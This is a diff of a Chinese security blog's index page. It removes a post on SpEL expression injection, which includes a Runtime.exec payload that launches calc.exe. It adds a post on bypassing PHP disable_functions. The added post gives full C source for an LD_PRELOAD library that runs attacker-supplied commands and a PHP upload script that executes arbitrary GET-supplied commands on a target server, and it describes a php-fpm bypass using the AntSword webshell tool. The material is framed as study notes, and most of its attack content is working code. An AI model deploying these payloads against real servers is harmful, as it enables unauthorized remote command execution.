@@ -277,182 +277,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2021/09/13/spel-expression-injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="欣海余诚's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/09/13/spel-expression-injection/" itemprop="url">spel_expression_injection</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-13T11:01:16+08:00">
-                2021-09-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h2><p>先学习一波EL表达式。</p>
-<p>EL全名为Expression Language, 可以在JSP页面上直接使用。</p>
-<p>格式：${表达式内容}</p>
-<p>Demo:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.io.*,java.util.*&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String title = &quot;EL Example&quot;;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align=&quot;center&quot;&gt;</span><br><span class="line">	&lt;p&gt;username: $&#123;param[&quot;username&quot;]&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;query string: $&#123;pageContext.request.queryString&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;user-agent: $&#123;header[&quot;user-agent&quot;]&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;1+1: $&#123;1 + 1&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="1.png" alt="image"></p>
-<p>作用就是在JSP页面操作变量更加灵活。</p>
-<blockquote>
-<p>参考JSP菜鸟教程。</p>
-</blockquote>
-<h2 id="SpEL表达式"><a href="#SpEL表达式" class="headerlink" title="SpEL表达式"></a>SpEL表达式</h2><p>SpEL(Spring Expression Language)，即Spring表达式语言。类似JSP的EL表达式。</p>
-<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>可以直接操作Spring管理的各种bean、变量、properties配置文件等数据。</p>
-<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>Springboot Demo：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/testEL/&#123;el&#125;&quot;, method = RequestMethod.GET)</span><br><span class="line">public String testEL(@PathVariable String el)&#123;</span><br><span class="line">    //创建ExpressionParser解析表达式</span><br><span class="line">    ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">    //SpEL表达式语法设置在parseExpression()入参内</span><br><span class="line">    Expression exp = parser.parseExpression(el);</span><br><span class="line">    //执行SpEL表达式</span><br><span class="line">    Object value = exp.getValue();</span><br><span class="line"></span><br><span class="line">    return  value.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="2.png" alt="image"></p>
-<blockquote>
-<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010086122/article/details/81566515">https://blog.csdn.net/u010086122/article/details/81566515</a></p>
-</blockquote>
-<h3 id="从一到CTF题目学SpEL表达式注入"><a href="#从一到CTF题目学SpEL表达式注入" class="headerlink" title="从一到CTF题目学SpEL表达式注入"></a><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1015">从一到CTF题目学SpEL表达式注入</a></h3><p>原文过程讲的很清楚，这里记录几个点：</p>
-<ol>
-<li>调试Jar包方法：</li>
-</ol>
-<ul>
-<li>java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y -jar jar包名</li>
-<li>idea -&lt; edit configure -&gt; + Remote -&gt; 一切默认</li>
-<li>点击debug图标开始debug</li>
-</ul>
-<ol start="2">
-<li>Windows下弹出计算器payload：</li>
-</ol>
-<blockquote>
-<p>使用”T(Type)”来表示java.lang.Class类的实例，即如同java代码中直接写类名。</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(T(String).getClass().forName(&quot;java.lang.Runtime&quot;)),new String[]&#123;&quot;calc.exe&quot;&#125;)</span><br></pre></td></tr></table></figure>
-<p><img src="3.png" alt="image"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2021/09/07/A-Security-Response/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1965,6 +1789,177 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/09/04/bypass-disable-functions/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/09/04/bypass-disable-functions/" itemprop="url">绕过disable_functions实战</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-04T11:26:44+08:00">
+                2020-09-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x01-LD-PRELOAD"><a href="#0x01-LD-PRELOAD" class="headerlink" title="0x01 LD_PRELOAD"></a>0x01 LD_PRELOAD</h2><blockquote>
+<p>前提：putenv没有禁用</p>
+</blockquote>
+<p><code>evil.c</code>上传至目标服务器并编译为<code>evil.so</code></p>
+<blockquote>
+<p>gcc -shared -fPIC evil.c -o evil.so</p>
+</blockquote>
+<p>evil.c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    // get command line options and arg</span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    // unset environment variable LD_PRELOAD.</span><br><span class="line">    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br><span class="line">    // distribution (e.g., centos), I need crafty trick.</span><br><span class="line">    int i;</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &#x27;\0&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上传test.php至目标服务器，访问时传入三个参数命令、输出文件（需存在于服务器上，没有不会创建）、so文件。执行成功后，会在输出文件中看到命令执行结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/test.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/evil.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/391">一次艰难的渗透提权过程</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></li>
+</ul>
+<h2 id="0x02-php-fpm"><a href="#0x02-php-fpm" class="headerlink" title="0x02 php-fpm"></a>0x02 php-fpm</h2><p>使用蚁剑 bypass_disable_functions插件。</p>
+<p>前提：phpinfo中的server api是FPM/FastCGI，并且需要知道FPM/FCGI Address，也就是php-cgi-xx.sock，可以去猜测。蚁剑默认的地址不一定是对的。</p>
+<p><img src="1.jpg" alt="image"></p>
+<p>在插件市场下载插件，然后右键选择：</p>
+<p><img src="4.jpg" alt="image"></p>
+<p><img src="3.jpg" alt="image"></p>
+<p>选择<code>Fastcgi/PHP_FPM</code>模式，填写<code>PPM/FCGI</code> 地址，然后点击开始即可：</p>
+<p><img src="2.png" alt="image"></p>
+<p>之后再用蚁剑连接上传成功的<code>.antproxy.php</code>文件地址，就可以在虚拟终端执行命令了。</p>
+<h2 id="更多姿势"><a href="#更多姿势" class="headerlink" title="更多姿势"></a>更多姿势</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">lemon绕过disable_functions合辑</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/afanti/p/10140050.html">pcntl_exec()没有被禁用</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">更多PHP7下绕过姿势</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/06/07/hash-length-extension-attack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2176,7 +2171,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
